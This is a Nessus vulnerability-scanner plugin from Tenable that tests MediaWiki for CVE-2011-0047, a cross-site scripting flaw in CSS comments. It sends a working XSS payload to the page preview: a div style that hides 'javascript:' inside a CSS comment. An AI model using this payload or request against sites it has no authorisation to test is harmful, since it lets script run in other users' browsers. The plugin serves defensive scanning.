#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(51998);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2016/05/09 15:44:47 $");

  script_cve_id("CVE-2011-0047");
  script_bugtraq_id(46108);
  script_osvdb_id(70770);
  script_xref(name:"Secunia", value:"43142");

  script_name(english:"MediaWiki CSS Comments XSS");
  script_summary(english:"Checks for cross-site scripting in CSS comments.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a version of MediaWiki vulnerable to a
cross-site scripting attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"There is a cross-site scripting vulnerability in this installation of
MediaWiki that may allow an attacker to execute arbitrary script code
in the browser of an unsuspecting user.  Such script code could steal
authentication credentials and be used to launch other attacks.

This version of MediaWiki also contains a local file inclusion
vulnerability that is exploitable when running Microsoft Windows, but
this plugin did not test for that vulnerability."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5c3c879f");
  script_set_attribute(
    attribute:"see_also",
    value:"https://bugzilla.wikimedia.org/show_bug.cgi?id=27093"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"https://bugzilla.wikimedia.org/show_bug.cgi?id=27094"
  );
  script_set_attribute(attribute:"solution", value:"Upgrade to MediaWiki 1.16.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/02/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/02/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/02/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mediawiki:mediawiki");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("mediawiki_detect.nasl");
  script_require_keys("installed_sw/MediaWiki", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "MediaWiki";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];

function try_exploit(title)
{
  local_var bound, boundary, eol, headers, post, res, xss, output;

  eol = '\r\n';
  bound = 'NESSUS';
  boundary = '--' + bound;
  xss = '<div style="background-image:ur/*//*/l(javascript:alert(&#39;XSS&#39;))">NESSUS TEST</div>';

  # Format the post data into the format the server needs.
  post = boundary + eol;
  post += 'Content-Disposition: form-data; name="wpTextbox1"' + eol;
  post += eol;
  post += xss + eol;
  post += boundary + "--" + eol;

  headers = make_array(
    "Content-Type", "multipart/form-data; boundary=" + bound
  );

  # Try to preview an edit to the main page w/ some XSS in a CSS attribute.
  res = http_send_recv3(
    item         : dir + "/index.php?title=" + title + "&action=submit",
    add_headers  : headers,
    method       : "POST",
    data         : post,
    port         : port,
    exit_on_fail : TRUE
  );

  # If our XSS isn't somewhere on the page, we've failed. Note that
  # this won't match the contents of the textarea because the
  # less-than signs will be HTML entities in there.
  if (xss >!< res[2]) return FALSE;

  output = extract_pattern_from_resp(string:res[2], pattern:'ST:' + xss);
  if (empty_or_null(output)) output = strstr(res[2], xss);

  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    generic     : TRUE,
    xss         : TRUE, # Sets XSS KB item
    line_limit  : 6,
    request     : make_list(http_last_sent_request()),
    output      : chomp(output)
  );

  return TRUE;
}

# Try to exploit the CSS comment injection vulnerability. When initially
# installed, MediaWiki allows the Main Page to be anonymously edited.
if (!try_exploit(title:"Main_Page"))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(port:port, qs:dir));
